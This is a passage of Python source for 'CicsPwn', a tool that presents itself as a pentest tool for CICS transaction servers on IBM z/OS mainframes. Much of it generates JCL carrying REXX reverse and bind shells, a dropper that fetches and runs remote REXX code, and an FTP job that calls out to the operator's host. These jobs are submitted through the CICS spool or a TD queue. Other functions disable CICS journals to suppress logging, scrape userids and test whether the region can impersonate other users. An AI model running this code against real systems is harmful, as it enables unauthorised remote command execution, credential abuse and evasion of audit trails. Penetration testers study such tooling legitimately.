    arg sock, s; do i=1 to words(s);if words(s) = 0 then return 0
    if sock = word(s,i) then return 1;end;return 0
 exec_tso:
 parse arg do; text = '';u = OUTTRAP('out.'); """+cmd+"""
 u = OUTTRAP(OFF);DO i = 1 to out.0;text = text||out.i||nl;end;return text
 exec_cmd:
 parse arg sockID, do_it;t=SOCKET('SEND',sockID, exec_tso(do_it)||nl);
 te = SOCKET('SEND',sockID, '"""+prompt+"""');return 1;
/*
//SYSOUT     DD SYSOUT=*
//STEP01 EXEC  PGM=IKJEFT01
//SYSTSPRT DD  SYSOUT=*
//SYSTSIN  DD *
 EX 'CICSUSER."""+tmp+"""'
/*
//SYSIN    DD  DUMMY
/*EOF
"""
  
  return jcl_code

def ftp_jcl(lhost, job_name="FTPCICS"):
  """
     JOB that initiates an FTP connection from the mainframe to your FTP server
     
  """
  cmds = ""
  whine('Payload set to reverse FTP to '+lhost,'info')     
  
  if results.surrogat_user:
      whine('Submitting job using surrogate identity '+results.surrogat_user,'info')     
      job_card = '//'+job_name.upper()+' JOB (123456),USER='+results.surrogat_user+',CLASS=A'      
  else:
      job_card = '//'+job_name.upper()+' JOB (123456),CLASS=A'
      
  if not results.ftp_cmds:
      whine('Please point towards a valid ftp file containing commands to send','err')
      sys.exit()
  cmds_file = open(results.ftp_cmds,'r')
  if not cmds_file:
      whine('Could not open file '+results.ftp_cmds,'err')
      sys.exit()
  
  whine('Reading FTP commands from '+results.ftp_cmds,'info')
  
  for line in cmds_file:
     if line.find("#") != 0:
        cmds +=" "+line
  
  tmp = rand_name(randrange(3,7))  	
  
  
  
  jcl_code = "//"+job_name.upper()+" JOB ("+"123456768"+"""),CLASS=A
//FTPSTP1  EXEC PGM=FTP,REGION=2048K,
//             PARM='"""+lhost.split(":")[0]+""" """+lhost.split(":")[1]+"""(EXIT TIMEOUT 20'
//OUTPUT   DD  SYSOUT=H
//INPUT    DD  *
"""+cmds+"""
/*
"""
  
  return jcl_code

def reverse_rexx(lhost, username="CICSUSEC"):
  """
     JOB that fetches REXX script from remote host and executes in memory
     TODO: make it work....
  """
  cmds = "";
  whine('REXX dropper set to connect back at '+lhost,'info') 
  rexx_file = open(results.rexx_file,'r')
  if not rexx_file:
      whine('Could not open REXX file '+results.rexx_file,'err')
      sys.exit()
  
  for line in rexx_file:
     cmds +=line.strip() + ";"
  # start a socket listening in deamon mode
  t = ThreadListen(int(lhost.split(":")[1]),cmds)
  t.setDaemon(True)
  t.start() 
  
  job_name = username
  tmp = rand_name(randrange(3,7))
    
  if results.surrogat_user:
      whine('Submitting job using surrogate identity '+results.surrogat_user,'info')     
      job_card = '//'+job_name.upper()+' JOB (123456),USER='+results.surrogat_user+',CLASS=A'      
  else:
      job_card = '//'+job_name.upper()+' JOB (123456),CLASS=A' 
  
  jcl_code = job_card+"""
//CREATERX  EXEC PGM=IEBGENER
//SYSPRINT   DD SYSOUT=*
//SYSIN      DD DUMMY
//SYSUT2     DD DSN=CICSUSER."""+tmp+""",
//           DISP=(NEW,CATLG,DELETE),SPACE=(TRK,5),
//           DCB=(RECFM=FB,LRECL=80,BLKSIZE=27920)
//SYSUT1     DD *
 /* REXX */rh='"""+lhost.split(":")[0]+"""';rp='"""+lhost.split(":")[1]+"""';nl='25'x;cr='0D'x
    t=SOCKET('INITIALIZE','CLIENT',2);t=SOCKET('SOCKET',2,'STREAM','TCP');
    parse var t socket_rc s . ; if socket_rc <> 0 then do
       t= SOCKET('TERMINATE');exit 1;end
       par1='SOL_SOCKET';t=Socket('SETSOCKOPT',s,par1,'SO_KEEPALIVE','ON')
    t=SOCKET('SETSOCKOPT',s,par1,'SO_ASCII','On'),
    t=SOCKET('SOCKETSETSTATUS','CLIENT');
    t=SOCKET('CONNECT',s,'AF_INET' rp rh); c=''
    sox = SOCKET('RECV',s,10000);    
    parse var sox s_rc s_data_len s_data_text;
    c = DELSTR(s_data_text,LENGTH(s_data_text));
    interpret c
/*
//SYSOUT     DD SYSOUT=*
//STEP01 EXEC  PGM=IKJEFT01
//SYSTSPRT DD  SYSOUT=*
//SYSTSIN  DD *
 EX 'CICSUSER."""+tmp+"""'
/*
//SYSIN    DD  DUMMY
/*EOF
"""
  return jcl_code
  
def direct_rexx(username="CICSUSEC"):
  """
     JOB that waits for REXX script from remote host and executes in memory
     TODO: make it work....
  """
  whine('REXX dropper set to bind to port '+results.port,'info') 
    
  job_name = username
  tmp = rand_name(randrange(3,7))
    
  if results.surrogat_user:
      whine('Submitting job using surrogate identity '+results.surrogat_user,'info')     
      job_card = '//'+job_name.upper()+' JOB (123456),USER='+results.surrogat_user+',CLASS=A'      
  else:
      job_card = '//'+job_name.upper()+' JOB (123456),CLASS=A' 
  
  jcl_code = job_card+"""
//CREATERX  EXEC PGM=IEBGENER
//SYSPRINT   DD SYSOUT=*
//SYSIN      DD DUMMY
//SYSUT2     DD DSN=CICSUSER."""+tmp+""",
//           DISP=(NEW,CATLG,DELETE),SPACE=(TRK,5),
//           DCB=(RECFM=FB,LRECL=80,BLKSIZE=27920)
//SYSUT1     DD *
 /* REXX */;nl ='25'x
 te = socket('INITIALIZE','DAEMON',2);te = Socket('GetHostId')
 parse var te s_rc MF_IP .;te=SOCKET('SOCKET');parse var te s_rc s_id .
    te = Socket('SETSOCKOPT',s_id,'SOL_SOCKET','SO_KEEPALIVE','ON')
 t=Socket('BIND',s_id,'AF_INET' '"""+results.port+"""' MF_IP);t=Socket('Listen',s_id,2)
    cl = '';DO k=1 to 2
    te = Socket('Select','READ' s_id cl 'WRITE' 'EXCEPTION')
  parse upper var te 'READ' readin 'WRITE' writtin 'EXCEPTION' exceptin
  IF INLIST(s_id,readin) then do;te = Socket('Accept',s_id)
     parse var te src c_s . ;cl = c_s;te = Socket('Socketsetstatus')
     te = Socket('Setsockopt',c_s,'SOL_SOCKET','SO_ASCII','ON');END
    if readin = c_s then do;sox = SOCKET('RECV',c_s,10000);
    parse var sox s_rc s_data_len sd;cmd=DELSTR(sd,LENGTH(sd));
    interpret cmd;end;end;exit;
 INLIST: procedure
 arg sock, s; do i=1 to words(s);if words(s) = 0 then return 0
 if sock = word(s,i) then return 1;end;return 0
/*
//SYSOUT     DD SYSOUT=*
//STEP01 EXEC  PGM=IKJEFT01
//SYSTSPRT DD  SYSOUT=*
//SYSTSIN  DD *
 EX 'CICSUSER."""+tmp+"""'
/*
//SYSIN    DD  DUMMY
/*EOF
"""
  return jcl_code
  
def direct_jcl(port, job_name="PGMTEST", kind="tso"):
  """
     JOB that writes a reverse shell in REXX to a temporary file CICSUSER.*
     then executes said file
  """
  tmp = rand_name(randrange(4,7))
  
  if kind =="tso":
     prompt= "TSO > "
     cmd = "ADDRESS TSO do;"
  else:   
     prompt= "Shell > "
     cmd =  "CALL BPXWUNIX do,,out.;"
  
  if not port:
      port = '4445'
  whine('Payload set to bind '+kind+' at port '+port,'info')     
  if results.surrogat_user:
      whine('Submitting job using surrogate identity '+results.surrogat_user,'info')     
      job_card = '//'+job_name.upper()+' JOB (123456),USER='+results.surrogat_user+',CLASS=A'      
  else:
      job_card = '//'+job_name.upper()+' JOB (123456),CLASS=A'      
  
  jcl_code = job_card+"""
//CREATERX  EXEC PGM=IEBGENER
//SYSPRINT   DD SYSOUT=*
//SYSIN      DD DUMMY
//SYSUT2     DD DSN=CICSUSER."""+tmp+""",
//           DISP=(NEW,CATLG,DELETE),SPACE=(TRK,5),
//           DCB=(RECFM=FB,LRECL=80,BLKSIZE=27920)
//SYSUT1     DD *
 /* REXX */;nl ='25'x
 te = socket('INITIALIZE','DAEMON',2);te = Socket('GetHostId')
 parse var te s_rc MF_IP .;te = SOCKET('SOCKET');parse var te s_rc s_id .
    te = Socket('SETSOCKOPT',s_id,'SOL_SOCKET','SO_KEEPALIVE','ON')
 te=Socket('BIND',s_id,'AF_INET' '"""+port+"""' MF_IP);te=Socket('Listen',s_id,2)
    cl = '';DO k=1 to 1000
    te = Socket('Select','READ' s_id cl 'WRITE' 'EXCEPTION')
    parse upper var te 'READ' readin 'WRITE' writtin 'EXCEPTION' exceptin
  IF INLIST(s_id,readin) then do;te = Socket('Accept',s_id)
     parse var te src c_s . ;cl = c_s;te = Socket('Socketsetstatus')
     te = Socket('Setsockopt',c_s,'SOL_SOCKET','SO_ASCII','ON')
     te = SOCKET('SEND',c_s, '"""+prompt+"""');END    
    if readin = c_s then do;cmd_g = get_cmd(c_s)
     parse = exec_cmd(c_s,cmd_g);end;end;exit
 get_cmd:
  parse arg ss; sox = SOCKET('RECV',ss,10000);parse var sox s_rc;
  parse var sox s_rc s_data_len sd;cmd = DELSTR(sd, LENGTH(sd));return cmd
 INLIST: procedure
  arg sock, s; do i=1 to words(s);if words(s) = 0 then return 0
  if sock = word(s,i) then return 1;end;return 0
 exec_cmd:
  parse arg sockID, do_it;t=SOCKET('SEND',sockID, exec_tso(do_it)||nl);
  te = SOCKET('SEND',sockID, '"""+prompt+"""');return 1;
 exec_tso:
  parse arg do; text = '';u = OUTTRAP('out.'); """+cmd+"""
  u=OUTTRAP(OFF);DO i = 1 to out.0;text = text||out.i||nl;end;return text

/*
//SYSOUT     DD SYSOUT=*
//STEP01 EXEC  PGM=IKJEFT01
//SYSTSPRT DD  SYSOUT=*
//SYSTSIN  DD *
 EX 'CICSUSER."""+tmp+"""'
/*
//SYSIN    DD  DUMMY
/*EOF
"""
  return jcl_code  
  
def set_mixedCase():
    """
        Set the terminal to mixed case in case the JCL submitted containes OMVS code
    """
    em.send_pf3()
    whine('Setting the current terminal to mixed case',kind='info')
    em.move_to(1,2)
    em.safe_send(format_request(CEMT+' I TASK')) #CICS APPLID in VTAM
    em.send_enter()
    
    data = em.screen_get()
    for d in data:
        termID = None
        if "Fac(" in d and CEMT in d:
            pos = d.find("Fac(")+len("Fac(")
            termID = d[pos:pos+4]
            whine('Got TerminalID '+termID,'good', 1)
            break;
    if not termID:
        whine('Could not get terminal id via CEMT','err',1)
        return False;
        
    em.send_pf3()
    em.move_to(1,2)
    sleep(SLEEP)
    
    req_set_term = CECI+' SET TERM('+termID+') NOUCTRAN'
    em.safe_send(format_request(req_set_term))
    em.send_enter()
    em.send_enter()
    if "NORMAL" in data[22]:
      whine('Current terminal is NOW mixed case','good',1)
    else:
      whine('Could not set terminal to mixed case','err',1)
      return False
      
    return True
  
def open_spool():
    """
        Opens a spool on the LOCAL node
    """
    token = None
    em.move_to(1,2)
    if results.node:
       node = results.node.upper()
    else:
       node = 'LOCAL'
       
    req_open_spool = CECI+" SPOOLOPEN OUTPUT USERID('INTRDR  ') NODE('"+node+"') TOKEN(&TOKTEST)"
    em.safe_send(format_request(req_open_spool))
    em.send_enter()
    em.send_enter()
        
    data = em.screen_get()
    
    for d in data:
        #print d
        token = None
        if "Token( '" in d:
            pos = d.find("Token( '")+len("Token( '")
            token = d[pos:pos+8]
            if token.strip() != "" :
                whine('Spool open ! Got token '+token,'good')
            break
    if "RESPONSE: NORMAL" not in data[22]:
        whine('Could not grab a valid token...a good chance the spool disabled, use -i to verify','err')
        whine(data[22],'err')
    return token

def spool_write(token, jcl):
    """
        Submits the JCL one record at a time via SPOOLWrite
    """
    
    whine('Writting JCL to the spool (might take a few seconds)','info')      
    
    # write each line in a variable
    i = 0;
    total = jcl.count("\n")
    for j in jcl.split("\n"):        
        if len(j) > 80:
            whine("JCL dataset cannot exceed 80 bytes per line",'err')
            return False
        # Go the variable screen
        em.send_pf5()
                
        em.move_to(7,2)
        em.send_eraseEOF()
        em.send_enter()
        
        def_var = "&SQLKHDS  +00080"
        em.safe_send(def_var)
        em.send_enter()
        
        em.move_to(7,2)
        em.send_enter()
        k= 0;
        while k < len(j):
          em.move_to((k/64)+3,11)
          em.safe_send(j[k:k+64])
          k+=64
        em.send_enter
        
        #em.move_to(7,24)
        #em.safe_send(j)        
        #em.send_enter()
        #sleep()
        
        
        # back to the normal screen
        em.send_enter()
        em.move_to(1,2)
        req_spool_write = 'SPOOLWRITE TOKEN('+token+') FROM(&SQLKHDS) FLENGTH(80)'
        em.safe_send(format_request(req_spool_write))
        em.send_enter()  
        em.send_enter()
        
        #show_screen()  
        
        i += 1

        if i <= total:
          printProgress(i, total, prefix = '', suffix = 'Complete', barLength = 30)
                
        data = em.screen_get()
        if "RESPONSE: NORMAL" not in data[22]:
            print ''
            whine('Received error while writing JCL ('+str(i)+'):','err')
            whine(data[22],'err')
            return False
 
    whine('JCL Written successfully to the spool','good',1)   
    return 0

def spool_write2(token, jcl):
    whine('Writting JCL to the spool (might take a few seconds)','info')      
    
    # write each line in a variable
    i = 0;
    total = len(jcl)
    
    em.send_pf5()
    em.move_to(7,2)
    em.send_eraseEOF()
    em.send_enter()
    
    def_var = "&sqlkhds  "+str(total)
    em.safe_send(def_var)    
    em.send_enter()
    
    em.move_to(7,2)
    em.send_enter()
    
    # large screen of variable
    
    while i < len(jcl):
        em.move_to((i/64)+3,11)
        em.safe_send(jcl[i:i+64])
        i+=64
    
   
    em.send_enter()    
    
    em.send_enter()
    em.move_to(1,2)
    request = 'SPOOLWRITE TOKEN(&TOKTEST) FROM(&SQLKHDS) FLENGTH('+str(total)+')                                '
    em.safe_send(request)
    em.send_enter()  
    em.send_enter()
    
    show_screen()
    data = em.screen_get()
    if "RESPONSE: NORMAL" not in data[22]:
        whine('Received error while writing JCL ('+str(i)+'):\n'+data[22],'err')
        sys.exit()
   
    whine('JCL Written successfully to the spool','good',1)   
    return 0

def close_spool():
    """
        Closes the spool
    """
    em.move_to(1,2)
    req_close_spool = 'SPOOLCLOSE TOKEN(&TOKTEST'
    em.safe_send(format_request(req_close_spool))
    em.send_enter()  
    em.send_enter()
    
    data = em.screen_get()  
    if "RESPONSE: NORMAL" not in data[22]:
            whine('Problem submitting the spool','err')
            whine(data[22],'err')
            return False
    whine('JOB submitted successfully to JES. Might take a few seconds to execute','good',1)
    
def check_tdqueue():
    """
        Checking if TDQueue is available before submitting a JOB
    """
    whine('Spool not available apparently, trying via TDQueue if available', 'info')
    em.send_pf3()
    em.move_to(1,2)
    queue='IRDR'
    if not results.queue:
       whine('No queue name provided, assuming default: IRDR', 'info')
    else:
       queue = results.queue.upper()
    if not (send_cics(CEMT+' INQUIRE TDQueue ('+queue+')',False)):
        whine("No TDQueue named "+queue+" is installed on CICS",'err')
        return False
    
    # activate TDQueue in case it was not
    send_cics('Set TDQueue ('+queue+') OPE ENA',False)  
    em.send_pf3()
    return True
    
def write_tdqueue(jcl):
    """
        Writes to a TDQueue pointing to INTRDR
    """
         
    em.move_to(1,2)
    if not results.queue:
        queue = "IRDR"
    else:
        queue = results.queue
        
    req_enq_tdq = CECI+" ENQ RESOURCE("+queue+")"
    em.safe_send(format_request(req_enq_tdq))
    em.send_enter()
    
    whine('Writing to the internal reader','info')
    i = 0;
    total = jcl.count('\n')
    for j in jcl.split("\n"):        
        # Go the variable screen
        em.send_pf5()
        
        em.move_to(7,2)
               
        
        em.send_eraseEOF()
        em.send_enter()
        
        def_var = "&SQLKHDS  +00080"
        em.safe_send(def_var)
        em.send_enter()
        #sleep()
        
        em.move_to(7,2)
        em.send_enter()
        k= 0;
        while k < len(j):
          em.move_to((k/64)+3,11)
          em.safe_send(j[k:k+64])
          k+=64
        em.send_enter
               
                
        
        # back to the normal screen
        em.send_enter()
        em.move_to(1,2)
        req_write_tdq = "WriteQ TD Queue("+queue+") FROM(&SQLKHDS) LENGTH(80)"
        em.safe_send(format_request(req_write_tdq))
        em.send_enter()  
        em.send_enter()
        
        
        i += 1
        if i <= total:
          printProgress(i, total, prefix = '', suffix = 'Complete', barLength = 30)
          
        data = em.screen_get()
        if "RESPONSE: NORMAL" not in data[22]:
            whine('Received error while writing JCL ('+str(i)+'):\n'+data[22],'err')
            return False
     
    req_deq_tdq = "DEQ RESOURCE("+queue+")"
    em.safe_send(format_request(req_deq_tdq))
    em.send_enter()
    whine('JCL Written to TDqueue, it should be executed any second','good',1)
    
def submit_job(kind,lhost="192.168.1.28:4444"):
    """
        calls open_spool, spool_write and spool_close to submit a JOB.
        if open_spool fails, calls write_tdqueue
    """
    if kind =="ftp" or kind =="custom":
       set_mixedCase()
       em.send_pf3()    
    
    method = None
    token = open_spool()
    #token = None
    if token:
         method = "spool"
    elif not token and check_tdqueue():
         method="tdqueue"
    else:
       whine('Can not submit JCL through this APPID','err')
       sys.exit()
    
    # Setting mixed case terminal
    
    # Preparing JCL
    if results.jcl and kind=="custom":
       f = open(results.jcl,"r")
       lines = f.readlines()
       if lines[len(lines)-1] !="/*EOF":
          whine("/*EOF added to the JCL to start the JOB immediatly",'info')
          lines.append("/*EOF")
       jcl = ''.join(lines)
    
    elif kind=="dummy":
        whine('Dummy JCL used for this attempt','info')
        jcl = dummy_jcl(lhost)
    elif kind=="reverse_tso":
        jcl = reverse_jcl(lhost,kind="tso")
    elif kind=="reverse_unix":
        jcl = reverse_jcl(lhost,kind="unix")
    elif kind=="direct_tso":
        jcl = direct_jcl(results.port,kind="tso")
    elif kind=="direct_unix":
        jcl = direct_jcl(results.port,kind="unix")
    elif kind=="ftp":
        jcl = ftp_jcl(lhost)
    elif kind=="reverse_rexx":
        whine('REXX file must not contain any label or continuation statment','warn')
        jcl = reverse_rexx(lhost)    
    elif kind=="direct_rexx":
        whine('REXX file must not contain any label or continuation statment','warn')
        jcl = direct_rexx()    
    else:
        whine('Submit parameter must be one of the following: direct_unix, direct_tso, reverse_tso, reverse_unix, reverse_rexx, direct_rexx, ftp, custom, dummy','err')
        sys.exit()
    
    # Writting JCL        
    if method=="spool":
        spool_write(token, jcl)
        close_spool()
    elif method=="tdqueue":
        write_tdqueue(jcl)
    
    if kind=="reverse_rexx":
        start = int(time.time())
        whine('Waiting for incoming connection, timout set to 10 secs','info')
        while threading.active_count() > 1 and (int(time.time())-start) < 10:
            time.sleep(0.1)
        if (int(time.time())-start) >= 10:
            whine('Listener timed out, could not deliver payload','err')
    
    elif kind=="direct_rexx":
        whine('Waiting a few seconds before sending rexx payload','info')
        sleep(5)
        cmds = "";
        rexx_file = open(results.rexx_file,'r')
        for line in rexx_file:
            cmds +=line.strip() + ";"
        
        remote_ip = raw_input(bcolors.YELLOW+'[!] IP address of the USS segment of z/OS (try the same IP as  the host ): '+bcolors.ENDC)
        clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        clientsocket.connect((remote_ip.strip(), int(results.port)))
        rc = clientsocket.send(cmds)
        if  rc > 0:
            whine('Payload delivered successfully ('+str(rc)+' bytes)','good')
        else:
            whine('There was an error delivering the payload','err')

def activate_transaction(ena_trans):
    """
        Activates a transaction
    """
    em.move_to(1,2)
    trans_ena  = False
    ## get transaction properties ##
    if ena_trans.upper() != "ALL":
        req_list_trans = CEMT+' I TRANS('+ena_trans.upper()+')'
        em.safe_send(format_request(req_list_trans))
        em.send_enter()
   
        data = em.screen_get()    
        if "Ena " in data[2]:
            whine("Transaction "+ena_trans+" is already enabled", 'good')
            sys.exit();
        req_set_trans = 'Set TRANSACTION('+ena_trans.upper()+') ENA'
        
    em.move_to(1,2)
    if ena_trans.upper()=="ALL":
        req_set_trans = CEMT+' S TRANS ALL ENA'
        
    em.safe_send(format_request(req_set_trans))
    em.send_enter()
    data = em.screen_get()
    if "NORMAL" in data[2]:
        if ena_trans.upper()=="ALL":
            whine("All transactions are enabled", 'good')
        else:
            whine("Transaction "+ena_trans+" is enabled", 'good')

def disable_journal():
    """
        Disables logging in CICS (except for system logs)
    """
    number_journals = 0;
    all_journals = 0;
    em.move_to(1,2)
    req_set_jour = CEMT+" S JOURNAL ALL DIS"
    em.safe_send(format_request(req_set_jour))
    em.send_enter()
    
    data = em.screen_get()
    for d in data:
       if "Jou(" in d and "NORMAL" in d and "Dis" in d and "DFHLOG" not in d:
           number_journals +=1;
           all_journals += 1;
       elif "Jou(" in d and "NORMAL" not in d and "Ena" in d and "DFHLOG" not in d:
           pos= d.find("Jou(") + len("Jou(")
           whine("Journal "+d[pos:pos+8]+" could not be disabled",'err')
           all_journals += 1;
          
    if number_journals > 0:
       whine(str(number_journals)+" of "+str(all_journals) +" journals were disabled",'good')
    else:
       whine("Only DFHLOG is defined, cannot disable this system log",'err')

def fetch_userids():
    """
        Looks in different menus for userids
    """
    
    default_u = tcl_u = query_cics_scrap(CEMT+" I SYS", "Dfltuser(", 8, 0, 0)
    region_id= None;
    print default_u+" (Default user)" if default_u else '';
    
    tcl_u = query_cics_scrap(CEMT+" I TCL", "Installu(", 8, 0, 0)
    if not tcl_u:
      tcp_u = query_cics_scrap(CEMT+" I TCPIPSERV", "Installusrid(", 8, 1, 1)
      print tcp_u if tcp_u else '';
    else:
      print tcl_u
      
    con_u = query_cics_scrap(CEMT+" I CONN", "Changeusrid(", 8, 1, 1)
    print con_u if con_u else '';
    uri_u = query_cics_scrap(CEMT+" I URIMAP", "Userid(", 8, 1, 1)
    print uri_u  if uri_u else '';
    
    db2_u = query_cics_scrap(CEMT+" I DB2C", "Signid(", 8, 1, 1)
    print db2_u if db2_u else '';
    
    pro_u = query_cics_scrap(CEMT+" I PROFILE", "Installu(", 8, 0, 0)
    print pro_u if pro_u else '';
    
    uow_u = query_cics_scrap(CEMT+" I UOW ", "Use(", 8, 0, 0)
    if uow_u:
       for uu in uow_u.split("\n"):
           if default_u and default_u != uu:
              uu += " (Probbaly region ID)"
              region_id = uu
           print uu
    return region_id

def check_surrogat(surrogat_user):
    """
        use CECI QUERY Security to check if CICS region ID can impersonate another user
    """
    whine("A JOB gets submitted with CICS Region ID, which may or may not impersonate users no matter the result of this check", 'warn')
    variables = ["READ"]
    read = get_cics_value(CECI+' QUERY SECURITY RESC(FACILITY) RESID(XXX) RESIDL(3) ', variables, True)
    read = ''.join(read)
    if read == "+0000000035":
        whine('CICS does not use RACF/ACF2/TopSecret. It is impossible to query the SURROGAT class','err',0)
        sys.exit()    
    
    variables = ["READ"]
    length = str(len(surrogat_user)+ 6)
    
    read = get_cics_value(CECI+' QUERY SECURI RESC(SURROGAT) RESID('+surrogat_user.upper()+'.SUBMIT) RESIDL('+length+') ', variables, True)
    read = ''.join(read)
    if read == "+0000000035":
        whine('You can impersonate '+surrogat_user,'good',0)
    else:
        whine('You cannot impersonate '+surrogat_user,'err',0)
        
def check_propagate(propagate_user):
    """
        use CECI QUERY Security to check if CICS region ID can submit JOBS
    """
    variables = ["READ"]
    read = get_cics_value(CECI+' QUERY SECURITY RESC(FACILITY) RESID(XXX) RESIDL(3) ', variables, True)
    read = ''.join(read)
    if read == "+0000000035":
        whine('CICS does not use RACF/ACF2/TopSecret. It is impossible to query the SURROGAT class','err',0)
        sys.exit()    
    
    length = str(len(propagate_user))
    result = send_cics(CECI+' QUERY SECURI RESC(PROPCNTL) RESID('+propagate_user.upper()+') RESIDL('+length+')', True)
    
    if result:
        whine(propagate_user+' defined in PROPCNTL, it is not allowed to submit JOBS','err',0)
    else:
        whine(propagate_user+' not defined in PROPCNTL. It can submit JOBS','good',0)

    
def main(results):
    global DO_AUTHENT
    global AUTHENTICATED
    global CEMT
    global CECI       
    
    if (results.userid != None and results.password !=None):
       
       DO_AUTHENT = True
       data = em.screen_get()   
       pos_pass=1;
       logon_screen=False
       
       for d in data:
         if "Password" in d or "Code" in d:
           logon_screen=True
           break
         else:
           pos_pass +=1
       if logon_screen:
           do_authenticate(results.userid, results.password, pos_pass)
           whine("Successful authentication", 'info')
           AUTHENTICATED = True;
        
     
    # Assigning new transaction names to CECI and CEMT if need be
    CEMT = results.cemt
    CECI = results.ceci
    
    # Checking if APPLID provided is valid
    if not check_valid_applid(results.applid, DO_AUTHENT):
        whine("Applid "+results.applid+" not valid, try again maybe it's a network lag", "err")
        sys.exit()

    if results.info:
        whine("Getting information about CICS server (APPLID: "+results.applid+")", 'info')
        get_infos()

    elif results.trans:
        if len(results.pattern) > 4:
           whine('Transaction ID cannot be over 4 characters, ID will be truncated','err')
        if len(results.pattern) < 4 and "*" not in results.pattern:
           results.pattern +="****"
         
        transid = results.pattern[:4]
        whine("Getting all transactions that match "+transid, 'info')
        get_transactions(transid)
        
    elif results.files:
        if len(results.pattern) > 8:
            whine('Filename cannot be over 8 characters, Name will be truncated','err')
        if len(results.pattern) < 8 and "*" not in results.pattern:
           results.pattern +="********"
         
        filename = results.pattern[:8]    
        
        whine("Getting all files that match "+filename, 'info')
        get_files(filename)
        
    elif results.tsqueues:
        if len(results.pattern) > 16:
           whine('TS queues\' ID cannot be over 16 characters, TS queue name will be truncated','err')
        if len(results.pattern) < 16 and "*" not in results.pattern:
           results.pattern +="****"
         
        tsqueues = results.pattern[:16]
        whine("Getting all tsqueues that match "+tsqueues, 'info')
        get_tsqueues(tsqueues)
        
    elif results.filename:
        whine("Getting Attributes of file "+results.filename, 'info')
        get_file_content()
    
    elif results.tsq_name:
        whine("Getting content of TSQeueue "+results.tsq_name, 'info')
        get_tsq_content()

    elif results.ena_trans:
        if results.ena_trans=="ALL":
            whine("Activating ALL transactions", 'info')
        else:    
            whine("Activating the transaction "+results.ena_trans, 'info')
        if len(results.ena_trans) != 4 and results.ena_trans !="ALL":
            whine("Transaction ID has to be 4 characters long "+results.ena_trans+", or be equal to ALL", 'err')
            sys.exit()
            
        activate_transaction(results.ena_trans)
        
    elif results.submit:
        submit_job(results.submit,results.lhost)

    elif results.journal:
        whine("Disabling journal before moving on", 'info')
        disable_journal()

    elif results.userids:
        whine("Scraping userids from different menus", 'info')
        fetch_userids()
        
    elif results.surrogat_user:
        whine("Checking whether you can impersonate Userid "+results.surrogat_user, 'info')
        check_surrogat(results.surrogat_user)
        
    elif results.propagate_user:
        whine("Checking whether "+results.propagate_user+' can submit JOBs', 'info')
        check_propagate(results.propagate_user)
    
    elif results.all_options:
        get_infos()
        print ""
        whine("Getting all files", 'info')
        get_files("*")
        print ""
        whine("Getting all tsqueues", 'info')
        get_tsqueues("*")
        print ""
        whine("Scraping userids from different menus", 'info')
        em.send_pf3();
        region_id = fetch_userids()
        if region_id:
             check_propagate(region_id)
            
    
    em.terminate()
  

     
if __name__ == "__main__" :
    
    logo() 
        
        # Set the emulator intelligently based on your platform
    if platform.system() == 'Darwin':
      class WrappedEmulator(EmulatorIntermediate):
        x3270App.executable = 'x3270'
        s3270App.executable = 's3270'
    elif platform.system() == 'Linux':
      class WrappedEmulator(EmulatorIntermediate):
        x3270App.executable = 'x3270'
        s3270App.executable = 's3270'
    elif platform.system() == 'Windows':
      class WrappedEmulator(EmulatorIntermediate):
        x3270App.executable = 'wc3270.exe'
    else:
      whine('Your Platform:' + platform.system() + 'is not supported at this time.',kind='err')
      sys.exit(1)    
    
    signal.signal(signal.SIGINT, signal_handler)

    parser = argparse.ArgumentParser(description='CicsPwn: a tool to pentest CICS transaction servers on z/OS')
    parser.add_argument('IP',help='The z/OS Mainframe IP or Hostname')
    parser.add_argument('PORT',help='CICS/VTAM server Port')
    parser.add_argument('-a','--applid',help='CICS ApplID on VTAM, default is CICS',default="CICS",dest='applid')

    group_info = parser.add_argument_group("Information gathering")
    group_storage = parser.add_argument_group("Storage options")
    group_trans = parser.add_argument_group("Transaction options")
    group_access = parser.add_argument_group("Access options")
    group_job = parser.add_argument_group("JOB options")
    
    group_info.add_argument('-A', '--all', help='Gather all information about a CICS Transaction Server',action='store_true',default=False,dest='all_options')
    group_info.add_argument('-i', '--info', help='Gather basic information about a CICS region',action='store_true',default=False,dest='info')    
    group_info.add_argument('-u', '--userids', help='Scrape userids found in different menus',action='store_true',default=False,dest='userids')
    group_info.add_argument('-p', '--pattern', help='Specify a pattern of a files/transaction/tsqueue to get (default is "*")',default="*",dest='pattern')
    group_info.add_argument('-q', '--quiet', help='Remove Trailing and journal before performing any action',action='store_true',default=False,dest='journal')
    group_info.add_argument('--ceci', help='CECI new transaction name. Result of -i option.',default="CECI",dest='ceci')
    group_info.add_argument('--cemt', help='CEMT new transaction name. Result of -i option.',default="CEMT",dest='cemt')
    
    
    group_trans.add_argument('-t','--trans', help='Get all installed transactions on a CICS TS server',action='store_true', default=False, dest='trans')
    group_trans.add_argument('--enable-trans', help='Enable a transaction (keyword ALL to enable every transaction) ',dest='ena_trans')
    
    
    group_storage.add_argument('-f','--files', help='List all installed files a on TS CICS',action='store_true',default=False,dest='files')
    group_storage.add_argument('-e','--tsqueues', help='List all temporary storage queues on TS CICS',action='store_true',default=False,dest='tsqueues')
    group_storage.add_argument('--get-file', help='Get the content of a file. It attempts to change the status of the file if it\'s not enabled, opened or readable',dest='filename')
    group_storage.add_argument('--get-tsq', help='Get the content of a temporary storage queue. ',dest='tsq_name')
    group_storage.add_argument('--enable-files', help='Enable a file (keyword ALL to enable every file) ',dest='ena_files')    
    
    
    group_access.add_argument('-U', '--userid', help='Specify a userid to use on CICS', dest='userid')
    group_access.add_argument('-P', '--password', help='Specify a password for the userid', dest='password')
    group_access.add_argument('-r', help='Given the region user ID, checks wether you are allowed to use it to submit JOBs', default=False,dest='propagate_user')
    group_access.add_argument('-g', help='Checks wether you can impersonate another user when submitting a job', default=False,dest='surrogat_user')
    
    
    
    group_job.add_argument('-s','--submit',help='Submit JCL to CICS server. Specify: dummy,reverse_unix, reverse_tso, direct_unix, reverse_unix, ftp or custom (need -j option)',dest='submit')
    group_job.add_argument('--queue',help='Provides the name of the TD queue to submit a JOB',dest='queue')
    group_job.add_argument('--ftp-cmds',help='Files containig a list of ftp commands to execute',dest='ftp_cmds')
    group_job.add_argument('--node',help='System node name where the JOB should be submitted (works only with Spool functions)',dest='node')
    group_job.add_argument('-l','--lhost',help='Remote server to call back to for reverse shell (host:port)',dest='lhost')
    group_job.add_argument('--port',help='Remote port to open for bind shell in REXX',default='4445',dest='port')
    group_job.add_argument('--jcl',help='Custom JCL file to provide',dest='jcl')
